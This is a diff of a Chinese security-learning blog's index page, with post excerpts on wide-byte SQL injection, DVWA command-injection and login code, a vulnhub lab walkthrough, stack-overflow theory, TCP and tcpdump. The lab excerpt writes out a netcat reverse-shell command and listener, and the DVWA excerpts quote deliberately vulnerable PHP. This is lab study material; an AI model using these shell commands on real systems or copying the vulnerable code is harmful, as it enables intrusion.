@@ -1,241 +1,574 @@
-
- <!DOCTYPE HTML>
+<!DOCTYPE html>
 <html lang="zh-CN">
+
+
+
+
+
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <meta name="description" content="个人学习生活博客,寻志同道合朋友相互学习,共同进步.">
+  <meta name="author" content="Cray">
+  <meta name="keywords" content>
+  <title>CrayBlog</title>
+
+  <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/bootstrap/css/bootstrap.min.css">
+<link rel="stylesheet" href="/lib/mdbootstrap/css/mdb.min.css">
+<link rel="stylesheet" href="/lib/github-markdown/github-markdown.min.css">
+<link rel="stylesheet" href="https://at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+  <link rel="stylesheet" href="/lib/fancybox/jquery.fancybox.min.css">
+
+
   
-    <title>CrayBlog</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=3, minimum-scale=1">
-    
-    <meta name="author" content="Cray">
-    
-    <meta name="description" content="个人学习生活博客,寻志同道合朋友相互学习,共同进步.">
-    
-    
-    
-    
-    
-    <link rel="icon" href="/img/favicon.ico">
-    
-    
-    <link rel="apple-touch-icon" href="/img/pacman.jpg">
-    <link rel="apple-touch-icon-precomposed" href="/img/pacman.jpg">
-    
-    <link rel="stylesheet" href="/css/style.css">
-    <!-- Global site tag (gtag.js) - Google Analytics -->
-    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-146435492-1"></script>
-    <script>
-      window.dataLayer = window.dataLayer || [];
-      function gtag(){dataLayer.push(arguments);}
-      gtag('js', new Date());
-      gtag('config', 'GA_MEASUREMENT_ID');
-    </script>
+
+
 
 </head>
-</html>
-  <body>
-    <header>
-      <div>
-		
-			<div id="imglogo">
-				<a href="/"><img src="/img/logo.svg" alt="CrayBlog" title="CrayBlog"/></a>
-			</div>
-			
-			<div id="textlogo">
-				<h1 class="site-name"><a href="/" title="CrayBlog">CrayBlog</a></h1>
-				<h2 class="blog-motto"></h2>
-			</div>
-			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜单">
-			</a></div>
-			<nav class="animated">
-				<ul>
-					
-						<li><a href="/">Home</a></li>
-					
-						<li><a href="/archives">Archives</a></li>
-					
-					<li>
-					
-					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
-						<label>Search</label>
-						<input type="text" id="search" name="q" autocomplete="off" maxlength="20" placeholder="搜索" />
-						<input type="hidden" name="q" value="site:L0yy.github.io">
-					</form>
-					
-					</li>
-				</ul>
-			</nav>			
+
+
+<body>
+  <header style="height: 100vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>CrayBlog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">Home</a>
+          </li>
+        
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">Archives</a>
+          </li>
+        
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/categories/">Categories</a>
+          </li>
+        
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">Tags</a>
+          </li>
+        
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">About</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+
+</nav>
+
+    <div class="view intro-2" id="background"
+         style="background: url('/img/default.png')no-repeat center center;
+           background-size: cover;
+           background-attachment: fixed;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+          </div>
+
+          
+            <div class="scroll-down-bar">
+              <i class="fa fa-angle-down scroll-down-arrow"></i>
+            </div>
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      <div class="container nopadding-md">
+        <div class="py-5 z-depth-3" id="board">
+          
+          <div class="container">
+            <div class="row">
+              <div class="col-12 col-md-10 m-auto">
+                
+
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2019/06/11/WEB温习第二天/">
+        <p class="h4 index-header">web渗透基础二</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">
+宽字节注入是利用mysql的一个特性，mysql在使用GBK编码（GBK就是常说的宽字节之一，实际上只有两字节）的时候，会认为两个字符是一个汉字（前一个ascii码要大于128，才到汉字的范围），而当我们输入有单引号时会自动加入\进行转义而变为\’（在PHP配置文件中magic_quotes_gpc=On的情况下或者使用addslashes函数，icov函数，mysql_real_escape_string函数、mysql_escape_string函数等，提交的参数中如果带有单引号’，就会被自动转义\’，使得多数注入攻击无效），由于宽字节带来的安全问题主要是吃ASCII字符(一字节)的现象，将后面的一个字节与前一个大于128的ascii码进行组合成为一个完整的字符（mysql判断一个字符是不是汉字，首先两个字符时一个汉字，另外根据gbk编码，第一个字节ascii码大于128，基本上就可以了），此时’前的\就被吃了，我们就可以使用’了，利用这个特性从而可实施SQL注入的利用。
+
 </div>
+        </div>
+      </a>
 
-    </header>
-    <div id="container">
-      <div id="main">
-
-  <section class="post" itemscope itemprop="blogPost">
-  
-    <a href="/2019/06/11/WEB温习第二天/" title="web渗透基础二" itemprop="url">
-  
-    <h1 itemprop="name">web渗透基础二</h1>
-    
-     
-           <p itemprop="description" >宽字节注入是利用mysql的一个特性，mysql在使用GBK编码（GBK就是常说的宽字节之一，实际上只有两字节）的时候，会认为两个字符是一个汉字（前一个ascii码要大于128，才到汉字的范围），而当我们输入有单引号时会自动加入\进行转义而变为\’（在PHP配置文件中magic_</p>
+      <div>
         
-    
-    <time datetime="2019-06-11T10:20:56.000Z" itemprop="datePublished">2019-06-11</time>
-  </a>
-</section>
+          <i class="iconfont icon-riqi2"></i>&nbsp;2019-06-11&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/CTF">CTF</a>&nbsp;
+          &nbsp;
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5">宽字节注入</a>&nbsp;
+          
+        
+      </div>
+    </div>
+  </div>
 
-  <section class="post" itemscope itemprop="blogPost">
-  
-    <a href="/2019/06/11/WEB温习第三天/" title="web渗透基础三" itemprop="url">
-  
-    <h1 itemprop="name">web渗透基础三</h1>
+  <div class="row mb-4 mx-auto">
     
-     
-           <p itemprop="description" >命令执行以及反弹shell姿势还是DVWA靶机的Command Injection
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2019/06/11/WEB温习第三天/">
+        <p class="h4 index-header">web渗透基础三</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">命令执行以及反弹shell姿势还是DVWA靶机的Command Injection
 功能是在本地使用shell_exec执行ping命令
-Low&amp;lt;?php 
+Low&lt;?php 
 
-if( isset( $_POST[ &amp;#39;Submit&amp;#39; ]  ) ) { 
-    // Get </p>
+if( isset( $_POST[ &#39;Submit&#39; ]  ) ) { 
+    // Get input 
+    $target = $_REQUEST[ &#39;ip&#39; ]; 
+
+    // Determine OS and execute the ping command. 
+    if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) { 
+        // Windows 
+        $cmd = shell_exec( &#39;ping  &#39; . $target ); 
+    } 
+    else { 
+        // *nix 
+        $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );
+    } 
+
+    </div>
+        </div>
+      </a>
+
+      <div>
         
-    
-    <time datetime="2019-06-11T10:20:56.000Z" itemprop="datePublished">2019-06-11</time>
-  </a>
-</section>
+          <i class="iconfont icon-riqi2"></i>&nbsp;2019-06-11&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/CTF">CTF</a>&nbsp;
+          &nbsp;
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/DVWA">DVWA</a>&nbsp;
+          
+            <a href="/tags/php">php</a>&nbsp;
+          
+            <a href="/tags/linux">linux</a>&nbsp;
+          
+            <a href="/tags/%E5%8F%8D%E5%BC%B9shell">反弹shell</a>&nbsp;
+          
+        
+      </div>
+    </div>
+  </div>
 
-  <section class="post" itemscope itemprop="blogPost">
-  
-    <a href="/2019/06/10/WEB温习第一天/" title="web渗透基础一" itemprop="url">
-  
-    <h1 itemprop="name">web渗透基础一</h1>
+  <div class="row mb-4 mx-auto">
     
-     
-           <p itemprop="description" >这之后都会是巩固的笔记，把以前留下的坑填一下。
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2019/06/10/WEB温习第一天/">
+        <p class="h4 index-header">web渗透基础一</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">这之后都会是巩固的笔记，把以前留下的坑填一下。
 DVWA Brute Force通过这个靶机来温习下sql注入的一下要点和防御。
 low源码
-&amp;lt;?php 
+&lt;?php 
 
-if( isset( $_GET[ &amp;#39;Login&amp;#39; ] ) ) { 
-    // Get user</p>
+if( isset( $_GET[ &#39;Login&#39; ] ) ) { 
+    // Get username 
+    $user = $_GET[ &#39;username&#39; ]; 
+
+    // Get password 
+    $pass = $_GET[ &#39;password&#39; ]; 
+    $pass = md5( $pass ); 
+
+    // Check the database 
+    $query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;; 
+    $result = mysql_query( $query ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() </div>
+        </div>
+      </a>
+
+      <div>
         
-    
-    <time datetime="2019-06-10T10:20:56.000Z" itemprop="datePublished">2019-06-10</time>
-  </a>
-</section>
+          <i class="iconfont icon-riqi2"></i>&nbsp;2019-06-10&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/CTF">CTF</a>&nbsp;
+          &nbsp;
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/DVWA">DVWA</a>&nbsp;
+          
+            <a href="/tags/SQL%E6%B3%A8%E5%85%A5">SQL注入</a>&nbsp;
+          
+        
+      </div>
+    </div>
+  </div>
 
-  <section class="post" itemscope itemprop="blogPost">
-  
-    <a href="/2019/06/03/silky：0x02靶机总结/" title="silky：0x02靶机总结" itemprop="url">
-  
-    <h1 itemprop="name">silky：0x02靶机总结</h1>
+  <div class="row mb-4 mx-auto">
     
-     
-           <p itemprop="description" >靶机靶机来源vulnhub
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2019/06/03/silky：0x02靶机总结/">
+        <p class="h4 index-header">silky：0x02靶机总结</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">靶机靶机来源vulnhub
 下载 ova文件，VM 或 VB 都是可以直接打开的
 渗透具体可以详细可以参阅 YouTube
 我这里来记录下我的过程
 扫主机nmap 10.0.0.0/24我的是这个网段
 或者直接使用netdiscover进行主机发现，比不过比较慢
-我这里的靶机IP</p>
-        
-    
-    <time datetime="2019-06-03T10:20:56.000Z" itemprop="datePublished">2019-06-03</time>
-  </a>
-</section>
+我这里的靶机IP是10.0.0.141
+扫服务 nmap -A 10.0.0.141 扫出具体的端口及其服务。
+发现 22 端口和 80 直接访问80 
+打开看是一个登陆页面，随意点点看，有个登陆页
+后台路径遍历dirb http://10.0.0.141 /var/share/wordlists/dirb/common.txt
+没有扫出什么有用的，搞登陆页
+登陆页弱口令试试，没发现什么。hydra 爆破 http有待学习，
+根据视频提示username 参数有代码执行
+代码执行这里直接上一个nc的反弹shell
+nc 10.0.0.141 8848 -t -e /bin/bash
+攻击机这边监听
+nc -lnvp 8848
+界面不好看，上一个python的pty
+python -c &quot;import pty;pty.</div>
+        </div>
+      </a>
 
-  <section class="post" itemscope itemprop="blogPost">
-  
-    <a href="/2019/05/30/内存基础/" title="内存基础" itemprop="url">
-  
-    <h1 itemprop="name">内存基础</h1>
-    
-     
-           <p itemprop="description" >原文地址
-看点好玩的东西显然，并非每次应用程序崩溃都会导致漏洞利用。在许多情况下，应用程序崩溃不会导致利用…但有时它会。对于“exploitation”，我的意思是你希望应用程序做一些不打算做的事情……例如运行你自己的代码。使应用程序执行不应该执行的操作的最简单方法是控制其应用程</p>
+      <div>
         
-    
-    <time datetime="2019-05-30T00:41:45.000Z" itemprop="datePublished">2019-05-30</time>
-  </a>
-</section>
+          <i class="iconfont icon-riqi2"></i>&nbsp;2019-06-03&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/CTF">CTF</a>&nbsp;
+          &nbsp;
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/linux">linux</a>&nbsp;
+          
+            <a href="/tags/web%E6%B8%97%E9%80%8F">web渗透</a>&nbsp;
+          
+        
+      </div>
+    </div>
+  </div>
 
-  <section class="post" itemscope itemprop="blogPost">
-  
-    <a href="/2019/05/14/TCP总结/" title="TCP总结" itemprop="url">
-  
-    <h1 itemprop="name">TCP总结</h1>
+  <div class="row mb-4 mx-auto">
     
-     
-           <p itemprop="description" >这里总结下TCP的三次握手，数据传输和四次分手过程
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2019/05/30/内存基础/">
+        <p class="h4 index-header">内存基础</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1"> 原文地址
+看点好玩的东西显然，并非每次应用程序崩溃都会导致漏洞利用。在许多情况下，应用程序崩溃不会导致利用…但有时它会。对于“exploitation”，我的意思是你希望应用程序做一些不打算做的事情……例如运行你自己的代码。使应用程序执行不应该执行的操作的最简单方法是控制其应用程序流（并将其重定向到其他位置）。这可以通过控制指令指针（或程序计数器）来完成，指令指针是一个CPU寄存器，它包含一个指针，指向需要执行的下一条指令所在的位置。假设应用程序使用参数调用函数。在转到函数之前，它将当前位置保存在指令指针中（因此它知道函数完成时返回的位置）。如果您可以修改此指针中的值，并将其指向内存中包含您自己的代码段的位置，那么您可以更改应用程序流并使其执行不同的操作（除了返回到原始位置）。您希望在控制流后执行的代码通常称为“shellcode”。因此，如果我们让应用程序运行我们的shellcode，我们可以将其称为有效的漏洞。在大多数情况下，此指针由术语EIP引用。该寄存器大小为4个字节。因此，如果您可以修改这4个字节，那么您拥有应用程序（以及运行应用程序的计算机）
+在我们开始之前 - 一些理论</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2019-05-30&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/%E9%80%86%E5%90%91">逆向</a>&nbsp;
+          &nbsp;
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/%E5%86%85%E5%AD%98">内存</a>&nbsp;
+          
+            <a href="/tags/%E6%BA%A2%E5%87%BA">溢出</a>&nbsp;
+          
+            <a href="/tags/%E6%A0%88">栈</a>&nbsp;
+          
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2019/05/14/TCP总结/">
+        <p class="h4 index-header">TCP总结</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">这里总结下TCP的三次握手，数据传输和四次分手过程
 pdf文件地址TCP图解
 TCP头部
 
 来源连接端口（16位长）－识别发送连接端口
 目的连接端口（16位长）－识别接收连接端口
 序列号（seq，32位长）
-如果含有同步化旗标（SYN），则此为最初的序列号；第一个数据比特的序列码</p>
-        
-    
-    <time datetime="2019-05-14T14:50:41.000Z" itemprop="datePublished">2019-05-14</time>
-  </a>
-</section>
+如果含有同步化旗标（SYN），则此为最初的序列号；第一个数据比特的序列码为本序列号加一。
+如果没有同步化旗标（SYN），则此为第一个数据比特的序列码。
+确认号（ack，32位长）—期望收到的数据的开始序列号。也即已经收到的数据的字节长度加1。
+数据偏移（4位长）—以4字节为单位计算出的数据段开始地址的偏移值。
+保留（3比特长）—须置0
+标志符（9比特长）
+NS—ECN-nonce。
+CWR—Congestion Window Reduced。
+ECE—ECN-Echo有两种意思，取决于SYN标志的值。
+URG—为1表示高优先级数据包，紧急指针字段有效。
+ACK—为1表示确认号字段有效
+PSH—为1表示是带有PUSH标志的数据，指示接收方应该尽快将这个报文段交给应用层而不用等待缓冲区装满。
+RST—为1表示出现严重差错。可能需要重现创建TCP连接。还可以用于拒绝非法的报文段和拒绝连接</div>
+        </div>
+      </a>
 
-  <section class="post" itemscope itemprop="blogPost">
-  
-    <a href="/2019/05/13/https工作原理/" title="https 工作原理" itemprop="url">
-  
-    <h1 itemprop="name">https 工作原理</h1>
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2019-05-14&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0">课堂笔记</a>&nbsp;
+          &nbsp;
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/TCP">TCP</a>&nbsp;
+          
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
     
-     
-           <p itemprop="description" >https学习资料
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2019/05/13/https工作原理/">
+        <p class="h4 index-header">https 工作原理</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">https学习资料
 https基本原理1
 https基本原理2
-ssl原理解释</p>
-        
-    
-    <time datetime="2019-05-13T09:28:14.000Z" itemprop="datePublished">2019-05-13</time>
-  </a>
-</section>
+ssl原理解释
+</div>
+        </div>
+      </a>
 
-  <section class="post" itemscope itemprop="blogPost">
-  
-    <a href="/2019/05/13/tcpdump-记录/" title="tcpdump 记录" itemprop="url">
-  
-    <h1 itemprop="name">tcpdump 记录</h1>
-    
-     
-           <p itemprop="description" >tcpdump一些常用的选项。-s number：tcpdump默认只会截取前96字节的内容，要想截取所有的报文内容，就需要使用这个选项，其中number是需要截取的报文字节数，如果是0的话，表示截取报文全部内容；
--nn：表示不解析域名，直接显示IP，在netstat命令中，也</p>
+      <div>
         
-    
-    <time datetime="2019-05-13T07:18:48.000Z" itemprop="datePublished">2019-05-13</time>
-  </a>
-</section>
+          <i class="iconfont icon-riqi2"></i>&nbsp;2019-05-13&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0">课堂笔记</a>&nbsp;
+          &nbsp;
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/https">https</a>&nbsp;
+          
+        
+      </div>
+    </div>
+  </div>
 
-  <section class="post" itemscope itemprop="blogPost">
-  
-    <a href="/2019/05/12/HWTACACS和RADIUS的区别/" title="HWTACACS和RADIUS的区别" itemprop="url">
-  
-    <h1 itemprop="name">HWTACACS和RADIUS的区别</h1>
+  <div class="row mb-4 mx-auto">
     
-     
-           <p itemprop="description" >一 HWTACACS和RADIUS的区别
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2019/05/13/tcpdump-记录/">
+        <p class="h4 index-header">tcpdump 记录</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">tcpdump一些常用的选项。-s number：tcpdump默认只会截取前96字节的内容，要想截取所有的报文内容，就需要使用这个选项，其中number是需要截取的报文字节数，如果是0的话，表示截取报文全部内容；
+-nn：表示不解析域名，直接显示IP，在netstat命令中，也有这个选项；
+-X：同时使用hex和ascii显示报文内容；
+-S：显示绝对的序列号（sequence number），而不是相对编号；
+-i：指定监听的网卡，如果为-i any则表示监听所有的网卡；
+-v，-vv，-vvv：显示更多的详细信息；
+-c number：表示截取number个报文，然后结束；
+-w：将监听到的数据包写入文件中保存，而并不分析和打印出来；
+-A：只使用ascii打印报文的全部数据，不要和-X选项一起使用。截取HTTP请求的时候可以用sudo tcpdump -nSA port 80
+过滤器先进行使用实例详解时，有必要先掌握tcpdump一些基本的使用理论知识，先来说说过滤器。
+在服务器上的网络报文是异常的多，很多时候我们只关注和具体问题有关的数据报文，而这些有用的报文只占到很小的一部</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2019-05-13&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0">课堂笔记</a>&nbsp;
+          &nbsp;
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/TcpDump">TcpDump</a>&nbsp;
+          
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2019/05/12/HWTACACS和RADIUS的区别/">
+        <p class="h4 index-header">HWTACACS和RADIUS的区别</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">一 HWTACACS和RADIUS的区别
 1 传输层协议两者使用的传输层协议不同，HWTACACS使用的是TCP，而RADIUS采用的是UDP；
-2 认证、授权方式HWTACACS的认证、授权相互独立，如果把命令行设置为HWTACACS模式，则这个命令行的每一条命令都需要经过认证</p>
-        
-    
-    <time datetime="2019-05-12T06:31:22.000Z" itemprop="datePublished">2019-05-12</time>
-  </a>
-</section>
+2 认证、授权方式HWTACACS的认证、授权相互独立，如果把命令行设置为HWTACACS模式，则这个命令行的每一条命令都需要经过认证。而RADIUS的认证和授权是捆在一起的；
+3 加密方式HWTACACS对用户报文会进行整个加密，而RADIUS仅对用户密码进行加密。
+二 HWTACACS和RADIUS使用场合当用户需从本地网络与NAS建立连接从而取得访问其他网络的权利或取得使用某些网络资源时，一般都需对此类用户接入请求进行认证、授权和计费等。认证为合法用户将被分配网络资源，同时可对用户上线时间统计计时，并拒绝非法用户的请求。电信运营商和一些院校及企事业单位一般都采用HWTACACS或RADIUS服务器对接入用户进行有效控制，保证网络安全性和计时（方便计费）。
+</div>
+        </div>
+      </a>
 
-  <section class="post" itemscope itemprop="blogPost">
-  
-    <a href="/2019/05/11/HCIP-security了解/" title="HCIP-security了解" itemprop="url">
-  
-    <h1 itemprop="name">HCIP-security了解</h1>
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2019-05-12&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0">课堂笔记</a>&nbsp;
+          &nbsp;
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/HCIP">HCIP</a>&nbsp;
+          
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
     
-     
-           <p itemprop="description" >HCIP-Security 知识架构HCP1 HCIP-Security CISN构建安全网络架构 * 网络安全设备管理
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2019/05/11/HCIP-security了解/">
+        <p class="h4 index-header">HCIP-security了解</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">HCIP-Security 知识架构HCP1 HCIP-Security CISN构建安全网络架构 * 网络安全设备管理
 
      *   网络安全设备介绍
 
@@ -243,188 +576,228 @@ ssl原理解释</p>
 
      *   网络安全设备日志分析
 
-     *   网络安全设备统一运维</p>
+     *   网络安全设备统一运维
+
+ * 防火墙带宽管理
+
+     *   防火墙带宽管理概述
+
+     *   防火墙带宽管理实现原理
+
+     *   防火墙带宽管理配置部署
+
+     *   防火墙带宽管理故障排除
+
+ * 防火墙负载均衡
+
+     *   服务器负载均衡概述
+
+     *   服务器负载均衡实现原理
+
+     *   服务器负载均衡配置部署
+
+ * 防火墙高可靠性
+
+     *   BFD技术
+
+     *   IP-Link技术
+
+     *   Link-Group技术
+
+     *   Eth-Trunk技术
+
+     *   Bypass技术
+
+     *   双机热备技术
+
+     *   双机热备故障排除
+
+ * 防火墙虚拟系统
+
+     *   虚拟系统概述
+
+     * </div>
+        </div>
+      </a>
+
+      <div>
         
-    
-    <time datetime="2019-05-11T13:28:14.000Z" itemprop="datePublished">2019-05-11</time>
-  </a>
-</section>
+          <i class="iconfont icon-riqi2"></i>&nbsp;2019-05-11&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0">课堂笔记</a>&nbsp;
+          &nbsp;
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/HCIP">HCIP</a>&nbsp;
+          
+            <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C">计算机网络</a>&nbsp;
+          
+        
+      </div>
+    </div>
+  </div>
 
 
-  <nav id="page-nav" class="clearfix">
-    <a class="extend prev" rel="prev" href="/page/2/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/4/">Next &raquo;</a>
+
+  <nav aria-label="index posts navigation">
+    <ul class="pagination pg-blue justify-content-center mt-5">
+      
+      
+        <li class="page-item">
+          <a class="page-link" href="/page/2/#board">上一页</a>
+        </li>
+      
+      
+        <li class="page-item">
+          <a class="page-link" href="/page/4/#board">下一页</a>
+        </li>
+      
+    </ul>
   </nav>
 
-</div>
-      <div class="openaside"><a class="navbutton" href="#" title="显示侧边栏"></a></div>
 
-<div id="asidepart">
-<div class="closeaside"><a class="closebutton" href="#" title="隐藏侧边栏"></a></div>
-<aside class="clearfix">
 
-  
-<div class="categorieslist">
-	<p class="asidetitle">分类</p>
-		<ul>
-		
-			<li><a href="/categories/CTF/" title="CTF">CTF<sup>7</sup></a></li>
-		
-			<li><a href="/categories/Docker/" title="Docker">Docker<sup>1</sup></a></li>
-		
-			<li><a href="/categories/Git/" title="Git">Git<sup>1</sup></a></li>
-		
-			<li><a href="/categories/docker/" title="docker">docker<sup>1</sup></a></li>
-		
-			<li><a href="/categories/博客/" title="博客">博客<sup>2</sup></a></li>
-		
-			<li><a href="/categories/样本详细分析/" title="样本详细分析">样本详细分析<sup>5</sup></a></li>
-		
-			<li><a href="/categories/编程/" title="编程">编程<sup>3</sup></a></li>
-		
-			<li><a href="/categories/课堂学习/" title="课堂学习">课堂学习<sup>1</sup></a></li>
-		
-			<li><a href="/categories/课堂笔记/" title="课堂笔记">课堂笔记<sup>9</sup></a></li>
-		
-			<li><a href="/categories/逆向/" title="逆向">逆向<sup>13</sup></a></li>
-		
-		</ul>
-</div>
-
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    
+  </main>
 
   
-<div class="tagslist">
-	<p class="asidetitle">标签</p>
-		<ul class="clearfix">
-		
-			<li><a href="/tags/Angr/" title="Angr">Angr<sup>1</sup></a></li>
-		
-			<li><a href="/tags/DVWA/" title="DVWA">DVWA<sup>2</sup></a></li>
-		
-			<li><a href="/tags/GCC/" title="GCC">GCC<sup>1</sup></a></li>
-		
-			<li><a href="/tags/HCIP/" title="HCIP">HCIP<sup>2</sup></a></li>
-		
-			<li><a href="/tags/IDA/" title="IDA">IDA<sup>3</sup></a></li>
-		
-			<li><a href="/tags/OD/" title="OD">OD<sup>1</sup></a></li>
-		
-			<li><a href="/tags/PE/" title="PE">PE<sup>1</sup></a></li>
-		
-			<li><a href="/tags/Python/" title="Python">Python<sup>1</sup></a></li>
-		
-			<li><a href="/tags/Rat-H-worm/" title="Rat H-worm">Rat H-worm<sup>2</sup></a></li>
-		
-			<li><a href="/tags/SEH/" title="SEH">SEH<sup>1</sup></a></li>
-		
-			<li><a href="/tags/SQL注入/" title="SQL注入">SQL注入<sup>1</sup></a></li>
-		
-			<li><a href="/tags/TCP/" title="TCP">TCP<sup>1</sup></a></li>
-		
-			<li><a href="/tags/TcpDump/" title="TcpDump">TcpDump<sup>1</sup></a></li>
-		
-			<li><a href="/tags/Win32/" title="Win32">Win32<sup>1</sup></a></li>
-		
-			<li><a href="/tags/Windbg/" title="Windbg">Windbg<sup>1</sup></a></li>
-		
-			<li><a href="/tags/coding/" title="coding">coding<sup>1</sup></a></li>
-		
-			<li><a href="/tags/dll/" title="dll">dll<sup>1</sup></a></li>
-		
-			<li><a href="/tags/docker/" title="docker">docker<sup>1</sup></a></li>
-		
-			<li><a href="/tags/github/" title="github">github<sup>1</sup></a></li>
-		
